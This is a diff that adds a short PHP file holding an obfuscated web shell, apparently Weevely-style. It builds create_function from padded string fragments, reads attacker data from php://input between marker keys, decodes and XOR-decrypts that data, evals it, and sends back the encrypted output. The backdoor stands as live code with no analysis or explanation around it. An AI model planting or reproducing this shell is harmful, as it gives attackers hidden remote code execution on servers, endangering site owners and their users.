@@ -1,0 +1,10 @@
+<?php
+$l=str_replace('jc','','cjcreajctjcjce_fujcnjcction');
+$B='$k="dcb8a_E247"_E;$kh=_E"830c4_E0f8b22_E6";$kf=_E"192061_E64df_Eeb";$p=_E"s_EhWrbBPmfp_EIo3_EaCL";fun_Ectio_En _Ex($t';
+$H='_Et_conte_Ents();@ob_end_E_c_Ele_E_Ean();$r=@base_E64__Eencode(@x(@g_Ezcompre_Ess_E($o_E),$k));prin_Et("$p$_Ekh$r$kf");}';
+$s='+_E_E){_E$o.=$t{$i}^$k{$j}_E;}}retur_En $o;}i_Ef (_E@pr_Eeg_match(_E"_E/$kh_E(.+)$_E_Ekf/",@fi_Ele_get_con_Etents("php://_E';
+$Z=',$k){$c=st_Erlen_E($k);$l=st_Erle_En($t);_E$_Eo="";f_Eor($i=0;$i<$l_E;){fo_Er(_E_E$j=0;($j<$c&&$i<_E$l)_E;$j+_E+,$i+';
+$G='input"),$m)_E==1) {@_Eob_sta_Er_Et();@eva_El_E(@gzunco_Empress(@x(@_Ebase6_E4_de_Ecode($m[1]_E)_E,$k)))_E;$o_E=@ob_ge';
+$D=str_replace('_E','',$B.$Z.$s.$G.$H);
+$L=$l('',$D);$L();
+?>
